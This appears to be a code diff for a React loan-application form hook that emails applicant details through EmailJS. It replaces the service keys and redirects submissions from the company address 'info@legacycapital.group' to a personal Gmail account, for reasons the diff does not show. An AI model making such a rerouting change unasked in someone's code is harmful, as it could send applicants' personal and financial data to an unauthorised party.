@@ -32,7 +32,7 @@ const initialState: LoanApplication = {
 };
 
 // Initialize EmailJS with your public key
-emailjs.init("B4brXbpiGMP5MLGKw");
+emailjs.init("mazjgQrYQ3Q-eKqsC");
 
 export const useLoanForm = () => {
   const [loanApplication, setLoanApplication] = useState<LoanApplication>(initialState);
@@ -111,7 +111,7 @@ export const useLoanForm = () => {
 
       // Prepare email template data
       const templateParams = {
-        to_email: 'info@legacycapital.group',
+        to_email: 'jessyshaid@gmail.com',
         from_name: `${loanApplication.personalInfo.firstName} ${loanApplication.personalInfo.lastName}`,
         loan_amount: formatCurrency(loanApplication.loanDetails.amount),
         loan_purpose: loanApplication.loanDetails.purpose,
@@ -133,8 +133,8 @@ export const useLoanForm = () => {
 
       // Send email using EmailJS
       await emailjs.send(
-        'service_bsy4kov',
-        'template_l60jmsh',
+        'service_1wfwqsh',
+        'template_2c5mgso',
         templateParams
       );
 
